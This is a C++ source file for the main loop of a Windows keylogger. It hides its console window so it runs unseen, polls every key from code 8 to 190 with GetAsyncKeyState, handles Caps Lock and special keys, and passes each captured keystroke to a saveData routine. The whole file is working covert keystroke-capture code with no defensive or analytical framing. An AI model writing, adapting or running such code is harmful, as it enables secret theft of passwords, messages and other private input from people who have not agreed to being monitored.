#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <bits/stdc++.h>
#include <conio.h>
#include "mainloop.h"
#include "key_logging.h"
#include "transSpecialKey.h"

void MainLoop::run(){

    HWND hwnd = GetConsoleWindow();
    ShowWindow(hwnd, SW_HIDE);

    while (true) {

        for (int key = 8; key <= 190; key++){
            //std::cout << "Running : " << std::endl;
            if(GetAsyncKeyState(key) == -32767){
                
                //std::cout << "Key : "<< key << std::endl;
                isSpecialKey = std::find(std::begin(specialKeyArray), std::end(specialKeyArray), 
                    key) != std::end(specialKeyArray);

                if(isSpecialKey){
                    specialKeyChar = translateSpecialKey(key);

                    saveData(specialKeyChar);
                } else {
                    if(GetKeyState(VK_CAPITAL)) {
                        // CAPSLOCK is on
                        saveData(std::string(1, (char)key));
                    } else {
                        // CAPSLOCK is off
                        // Turn the character into lowercase before save
                        saveData(std::string(1, (char)std::tolower(key)));
                    }
                }
            }
        }
        char temp = getch();
    }
}